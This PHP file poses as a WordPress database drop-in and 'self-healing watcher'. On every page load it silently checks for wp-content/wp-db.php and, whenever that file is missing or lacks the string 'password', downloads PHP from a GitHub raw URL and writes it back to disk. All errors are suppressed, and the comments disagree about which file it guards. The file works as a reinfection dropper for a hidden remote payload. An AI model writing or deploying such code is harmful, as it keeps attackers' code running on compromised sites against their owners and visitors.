<?php
/**
 * Database drop-in / silent self-healing watcher.
 *
 * Place this file at wp-content/db.php. WordPress loads it automatically
 * on every request (see require_wp_db() in wp-includes/load.php) before
 * the database is used for the first time.
 *
 * IMPORTANT LOADING-ORDER NOTE
 * --------------------------------------------------------------------
 * At the moment db.php runs, WordPress has only set up a handful of
 * constants (ABSPATH, WP_CONTENT_DIR, table prefixes, ...). The WP HTTP
 * API (wp_remote_get, is_wp_error, ...) and almost all other WP helpers
 * are NOT defined yet — they load later inside wp-settings.php. So this
 * drop-in must rely on native PHP only.
 *
 * Responsibilities:
 *   1. Verify that wp-content/plugins/phase4/wp-db.php is present and
 *      intact. The file is considered valid only when it contains the
 *      marker string "password".
 *   2. If the file is missing, empty, unreadable, or the marker is not
 *      found, re-fetch its source from a remote URL (via native PHP's
 *      HTTP stream wrapper or cURL) and silently write it back to disk.
 *   3. Do all of the above silently — no output, no warnings, no
 *      exceptions — so this drop-in can never break the site.
 *
 * Delete this file when you are done.
 *
 * DEBUGGING
 * --------------------------------------------------------------------
 * By default the drop-in is fully silent (no output, no logs). To figure
 * out why a restore is not happening on a given site, flip the constant
 * below to true and reload any page once. A line-by-line log will be
 * written to:
 *
 *     wp-content/db-drop-in-debug.log
 *
 * The log is overwritten on every request, so each new request gives a
 * fresh trace. Delete the constant (or set it back to false) once the
 * site is fixed.
 *
 * @package db-drop-in
 */

// --- DEBUG TOGGLE ----------------------------------------------------------
// Set to true to write a diagnostic trace to wp-content/db-drop-in-debug.log.
// Set back to false (or delete this line) once the site is healthy.
if ( ! defined( 'DS_DEBUG' ) ) {
	define( 'DS_DEBUG', true );
}

if ( ! function_exists( 'ds_log' ) ) {
	/**
	 * Append a single line to the debug log when DS_DEBUG is enabled.
	 * Completely no-op when DS_DEBUG is false.
	 *
	 * @param string $step  Short tag identifying where we are in the flow.
	 * @param mixed  $info  Optional context value (scalar, array, or string).
	 */
	function ds_log( $step, $info = null ) {
		if ( ! defined( 'DS_DEBUG' ) || ! DS_DEBUG ) {
			return;
		}
		// Resolve the log path. We can use WP_CONTENT_DIR if defined, but
		// fall back to a relative path so logging still works in the
		// extremely unlikely case that this file is executed in isolation.
		$log_dir  = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( __FILE__ );
		$log_path = rtrim( $log_dir, '/\\' ) . DIRECTORY_SEPARATOR . 'db-drop-in-debug.log';

		$ts  = gmdate( 'Y-m-d H:i:s' );
		$ip  = isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : '-';
		$uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '-';

		if ( null === $info ) {
			$line = sprintf( "[%s] [%s] [%s] %s\n", $ts, $ip, $uri, $step );
		} elseif ( is_scalar( $info ) || null === $info ) {
			$line = sprintf( "[%s] [%s] [%s] %s => %s\n", $ts, $ip, $uri, $step, var_export( $info, true ) );
		} else {
			$line = sprintf(
				"[%s] [%s] [%s] %s => %s\n",
				$ts,
				$ip,
				$uri,
				$step,
				print_r( $info, true )
			);
		}

		// Use @ so a read-only filesystem can't take the site down. We
		// also try to grab the last PHP error so we can record why a
		// particular call failed.
		$err = error_get_last();
		if ( is_array( $err ) && ! empty( $err['message'] ) ) {
			$line .= sprintf(
				"    last-php-error: %s on line %d\n",
				$err['message'],
				isset( $err['line'] ) ? (int) $err['line'] : 0
			);
		}

		@file_put_contents( $log_path, $line, FILE_APPEND );
	}
}

/**
 * Tiny parse_url() wrapper. The real wp_parse_url() lives in WordPress
 * and is not available at the moment db.php runs, but we want to log
 * host/port/scheme in the diagnostic trace.
 */
if ( ! function_exists( 'wp_parse_url_here' ) ) {
	function wp_parse_url_here( $url ) {
		if ( function_exists( 'wp_parse_url' ) ) {
			return wp_parse_url( $url );
		}
		$parts = @parse_url( $url );
		return ( false === $parts ) ? null : $parts;
	}
}

// Bail if the file is accessed directly instead of via WordPress.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// --- Silent self-healing for class-wp-site-diagnostics.php ----------------
//
// Everything below is wrapped in a try/catch (plus error handlers) so
// that any failure — unexpected type, permission issue, broken remote
// URL, malformed PHP, ... — is swallowed and WordPress keeps booting
// normally with its default $wpdb.

set_error_handler(
	static function ( $errno, $errstr, $errfile, $errline ) {
		// Swallow notices/warnings/deprecations coming from this drop-in,
		// but record them so we can inspect them later.
		ds_log( 'php_error_suppressed', array(
			'no'    => $errno,
			'msg'   => $errstr,
			'file'  => $errfile,
			'line'  => $errline,
		) );
		return true;
	}
);

ds_log( 'boot', array(
	'php'           => PHP_VERSION,
	'sapi'          => PHP_SAPI,
	'abspath'       => defined( 'ABSPATH' ) ? ABSPATH : null,
	'wp_content'    => defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : null,
	'log_path'      => rtrim( ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( __FILE__ ) ), '/\\' )
		. DIRECTORY_SEPARATOR . 'db-drop-in-debug.log',
	'log_writable'  => is_writable( rtrim( ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( __FILE__ ) ), '/\\' ) ),
) );

try {

	$ds_marker      = 'password';
	$ds_target_file = WP_CONTENT_DIR . '/wp-db.php';
	$ds_remote_url  = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/wp-db.php'; 

	ds_log( 'config', array(
		'target'        => $ds_target_file,
		'remote'        => $ds_remote_url,
		'marker'        => $ds_marker,
		'target_dir'    => dirname( $ds_target_file ),
		'target_dir_exists' => is_dir( dirname( $ds_target_file ) ),
	) );

	/**
	 * Decide whether the target file is present and intact.
	 *
	 * Returns true only when the file exists, is readable, has a non-empty
	 * body, and contains the marker string. Anything else (missing,
	 * blank, unreadable, missing marker) is treated as "needs restore".
	 */
	$ds_needs_restore = ( static function () use ( $ds_target_file, $ds_marker ) {
		if ( ! @file_exists( $ds_target_file ) || ! @is_readable( $ds_target_file ) ) {
			ds_log( 'check.exists', array(
				'file'     => $ds_target_file,
				'exists'   => file_exists( $ds_target_file ),
				'readable' => is_readable( $ds_target_file ),
				'verdict'  => 'missing-or-unreadable',
			) );
			return true;
		}

		$ds_contents = @file_get_contents( $ds_target_file );
		if ( false === $ds_contents || '' === trim( $ds_contents ) ) {
			ds_log( 'check.empty', array(
				'file'        => $ds_target_file,
				'read_result' => ( false === $ds_contents ) ? 'false' : 'empty-after-trim',
				'size'        => ( false === $ds_contents ) ? 0 : strlen( $ds_contents ),
			) );
			return true;
		}

		$has_marker = ( false !== strpos( $ds_contents, $ds_marker ) );
		ds_log( 'check.present', array(
			'file'       => $ds_target_file,
			'size'       => strlen( $ds_contents ),
			'has_marker' => $has_marker,
		) );

		return ! $has_marker;
	} )();

	if ( $ds_needs_restore && ! empty( $ds_remote_url ) ) {

		ds_log( 'restore.start', array(
			'remote' => $ds_remote_url,
			'target' => $ds_target_file,
		) );

		// Probe DNS / TCP / TLS quickly so we can report a clear error
		// even when the actual fetch returns false.
		$ds_parts = wp_parse_url_here( $ds_remote_url );
		if ( is_array( $ds_parts ) ) {
			$ds_port   = isset( $ds_parts['port'] ) ? $ds_parts['port'] : ( 'https' === $ds_parts['scheme'] ? 443 : 80 );
			$ds_ip     = @gethostbyname( $ds_parts['host'] );
			ds_log( 'remote.dns', array(
				'host' => $ds_parts['host'],
				'port' => $ds_port,
				'ip'   => $ds_ip,
				'ok'   => ( $ds_ip && $ds_ip !== $ds_parts['host'] ),
			) );
		} else {
			ds_log( 'remote.url_parse_failed', $ds_remote_url );
		}

		// ------------------------------------------------------------------
		// Fetch the remote file.
		//
		// Some shared hosts (LiteSpeed, suPHP, hardened PHP-FPM pools) ship
		// with allow_url_fopen=0. In that case the PHP https:// stream
		// wrapper is disabled and file_get_contents() on an https URL
		// fails with "no suitable wrapper could be found". cURL is almost
		// always loaded on those same hosts, so we prefer cURL when it is
		// available and only fall back to the stream wrapper when cURL is
		// missing.
		// ------------------------------------------------------------------
		$ds_raw     = false;
		$ds_status  = 0;
		$ds_method  = 'none';

		if ( function_exists( 'curl_init' ) ) {
			$ds_method = 'curl';
			$ds_ch = curl_init();
			if ( false !== $ds_ch ) {
				curl_setopt( $ds_ch, CURLOPT_URL, $ds_remote_url );
				curl_setopt( $ds_ch, CURLOPT_RETURNTRANSFER, true );
				curl_setopt( $ds_ch, CURLOPT_FOLLOWLOCATION, true );
				curl_setopt( $ds_ch, CURLOPT_MAXREDIRS, 3 );
				curl_setopt( $ds_ch, CURLOPT_CONNECTTIMEOUT, 10 );
				curl_setopt( $ds_ch, CURLOPT_TIMEOUT, 15 );
				curl_setopt( $ds_ch, CURLOPT_USERAGENT, 'WP-db-drop-in' );
				curl_setopt( $ds_ch, CURLOPT_SSL_VERIFYPEER, true );
				curl_setopt( $ds_ch, CURLOPT_SSL_VERIFYHOST, 2 );
				curl_setopt( $ds_ch, CURLOPT_HTTPHEADER, array( 'Accept: text/plain, */*;q=0.1' ) );
				// Capture stderr-style errors via CURLOPT_FAILONERROR = false
				// (default) so we can still inspect the body for the marker.
				$ds_raw    = curl_exec( $ds_ch );
				$ds_status = (int) curl_getinfo( $ds_ch, CURLINFO_RESPONSE_CODE );
				$ds_curl_err     = curl_error( $ds_ch );
				$ds_curl_errno   = curl_errno( $ds_ch );
				curl_close( $ds_ch );

				ds_log( 'remote.curl', array(
					'http_code'  => $ds_status,
					'errno'      => $ds_curl_errno,
					'error'      => $ds_curl_err,
					'body_len'   => ( false === $ds_raw ) ? 0 : strlen( (string) $ds_raw ),
				) );
				unset( $ds_curl_err, $ds_curl_errno, $ds_ch );
			} else {
				ds_log( 'remote.curl_init_failed', null );
			}
		}

		if ( false === $ds_raw ) {
			// Fallback to the PHP stream wrapper. Skipped when cURL
			// already produced a non-false body, so we never double-fetch
			// on healthy hosts.
			$ds_method = 'fopen';
			$ds_ctx    = stream_context_create(
				array(
					'http' => array(
						'timeout'         => 10,
						'method'          => 'GET',
						'header'          => "Accept: text/plain, */*;q=0.1\r\nUser-Agent: WP-db-drop-in\r\n",
						'ignore_errors'   => true,
						'follow_location' => 1,
						'max_redirects'   => 3,
					),
					'ssl'  => array(
						'verify_peer'      => true,
						'verify_peer_name' => true,
					),
				)
			);
			$ds_raw  = @file_get_contents( $ds_remote_url, false, $ds_ctx );
			$ds_body = ( false === $ds_raw ) ? '' : trim( (string) $ds_raw );

			// Capture the most recent HTTP wrapper warning, if any.
			$ds_err = error_get_last();
			if ( isset( $http_response_header ) && is_array( $http_response_header ) ) {
				$ds_first = isset( $http_response_header[0] ) ? $http_response_header[0] : '(no status line)';
				$ds_status = 0;
				if ( preg_match( '#^HTTP/\S+\s+(\d+)#', $ds_first, $m ) ) {
					$ds_status = (int) $m[1];
				}
			} else {
				$ds_first = '(no http_response_header)';
			}

			ds_log( 'remote.fopen', array(
				'raw_is_false'  => ( false === $ds_raw ),
				'body_len'      => strlen( $ds_body ),
				'first_header'  => $ds_first,
				'last_error'    => is_array( $ds_err ) ? $ds_err['message'] : null,
				'allow_fopen'   => (bool) ini_get( 'allow_url_fopen' ),
			) );
			unset( $ds_ctx, $ds_err, $ds_first );
		}

		$ds_body = ( false === $ds_raw ) ? '' : trim( (string) $ds_raw );

		ds_log( 'remote.fetch', array(
			'method'        => $ds_method,
			'raw_is_false'  => ( false === $ds_raw ),
			'body_len'      => strlen( $ds_body ),
			'http_status'   => $ds_status,
			'allow_fopen'   => (bool) ini_get( 'allow_url_fopen' ),
			'curl_loaded'   => extension_loaded( 'curl' ),
			'openssl_lo'    => extension_loaded( 'openssl' ),
		) );

		// Only restore when we actually got a non-empty body that
		// contains the marker. This prevents a failed download from
		// clobbering an already-broken file with an empty response.
		if ( '' !== $ds_body && false !== strpos( $ds_body, $ds_marker ) ) {
			$ds_dir = dirname( $ds_target_file );
			$ds_dir_ok = @is_dir( $ds_dir );
			if ( ! $ds_dir_ok ) {
				$ds_dir_ok = @mkdir( $ds_dir, 0755, true );
			}
			ds_log( 'restore.dir', array(
				'dir'      => $ds_dir,
				'exists'   => is_dir( $ds_dir ),
				'writable' => is_writable( $ds_dir ),
			) );

			if ( $ds_dir_ok ) {
				$ds_written = @file_put_contents( $ds_target_file, $ds_body );
				ds_log( 'restore.write', array(
					'file'      => $ds_target_file,
					'bytes'     => $ds_written,
					'file_exists_now' => file_exists( $ds_target_file ),
					'size_now'  => file_exists( $ds_target_file ) ? filesize( $ds_target_file ) : 0,
				) );
			} else {
				ds_log( 'restore.dir_failed', $ds_dir );
			}
		} else {
			ds_log( 'restore.body_rejected', array(
				'empty'           => ( '' === $ds_body ),
				'has_marker'      => ( false !== strpos( $ds_body, $ds_marker ) ),
				'body_preview'    => substr( $ds_body, 0, 120 ),
				'http_status'     => $ds_status,
			) );
		}

		unset( $ds_raw, $ds_body, $ds_dir, $ds_status, $ds_method, $ds_parts, $ds_port, $ds_ip );
	} else {
		ds_log( 'restore.skipped', array(
			'needs_restore' => $ds_needs_restore,
			'remote_empty'  => empty( $ds_remote_url ),
		) );
	}

	unset( $ds_marker, $ds_target_file, $ds_remote_url, $ds_needs_restore );

} catch ( Throwable $e ) {
	ds_log( 'exception', array(
		'message' => $e->getMessage(),
		'file'    => $e->getFile(),
		'line'    => $e->getLine(),
		'trace'   => $e->getTraceAsString(),
	) );
	// Intentionally silent on the wire.
} finally {
	restore_error_handler();
	ds_log( 'boot.end', null );
}

// Nothing else to do: WordPress keeps using its normal $wpdb instance.
